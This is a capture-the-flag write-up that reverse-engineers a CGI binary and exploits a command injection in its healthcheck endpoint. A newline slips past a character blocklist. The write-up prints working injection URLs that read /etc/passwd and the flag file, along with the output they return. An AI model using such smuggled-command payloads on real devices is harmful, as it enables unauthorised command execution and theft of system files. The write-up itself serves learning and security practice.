# This is not a pwn challenge
As the name and description hints, there is not a lot of pwning going on in this challenge.

We are given a link and a file. When we navigate to the link we just get a 404. So lets take a look
at the file. The file is a CGI file, which is a filetype that can enable web servers to interact 
with external programs usually to help generate dynamic data. One thing to take note of here is 
that a CGI file **must** be located within the CGI-enabled directory which is usually `/cgi-bin/`.

So we can try navicating to `/cgi-bin/radio_net_module.cgi` and see whether we get anything. We end
up getting back an empty response but at least we got a `200 OK` status code.

We can take a look at the file using a reverse engineering tool such as [Ghidra](https://github.com/NationalSecurityAgency/ghidra).

If we take a look at the `main` function we can see a bunch of strings starting with `/api` like 
`/api/status`. If we navicate to `/cgi-bin/radio_net_module.cgi/api/status` we get back a JSON blob.
Clearly we are moving in the right direction. Taking a closer look we can see that the strings are 
used to match the path and call specific functions. 

Only three functions take query parameters `handle_logs`, `handle_reboot`, and `handle_healthcheck`.
`handle_logs` only allows integers and `handle_reboot` does not do anything.

So lets take a look at `handle_healthcheck`. We can see that it takes in a value through the `host`
parameter which is passed to `sanitize_input()` and then added into a call to the system command
`ping`, which ends up being passed to `popen`. So clearly we have a command injection in place.

But what does `sanitize_input()` do? Seems like it allows all characters except for characters in the
following list:

```
;&|$`()<>!\
```

Looks like it is not straight forward for us to exploit the command injection. However, this filter
fails to sanitize newlines. So we can exploit this with the help of a newline injection. Some might
get stuck here due to thinking that the backslash (`\`) will be filter in the newline, but these
are two separate bytes so it will not match. 

Let's try the newline injection and see what happens:

```
/cgi-bin/radio_net_module.cgi/api/healthcheck?host=a%0als
```

and we get back

```
Host 'a
ls' is RESPONDING.

------------------------------------
Healthcheck complete.
```

Taking a closer look at `handle_healthcheck` we can see that we don't get the output of the command
unless it fails. So we have to induce an error in the command that still allows for us to get the 
output. If we add a nonexistant file to `ls` we get back the error message from `ls`

```
Healthcheck failed
output:
------------------------------------
ls: a: No such file or directory

------------------------------------
Healthcheck complete.
```

So let's try reading some files with `cat` like so:

```
/cgi-bin/radio_net_module.cgi/api/healthcheck?host=%0acat+/etc/passwd+a
```

and we get

```
Healthcheck failed
output:
------------------------------------
root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/false
bin:x:2:2:bin:/bin:/bin/false
sys:x:3:3:sys:/dev:/bin/false
sync:x:4:100:sync:/bin:/bin/sync
mail:x:8:8:mail:/var/spool/mail:/bin/false
www-data:x:33:33:www-data:/var/www:/bin/false
operator:x:37:37:Operator:/var:/bin/false
nobody:x:65534:65534:nobody:/home:/bin/false
cat: can't open 'a': No such file or directory

------------------------------------
Healthcheck complete.
```

So we can get the `/flag.txt` by doing the following

```
/cgi-bin/radio_net_module.cgi/api/healthcheck?host=%0acat+/flag.txt+a
```
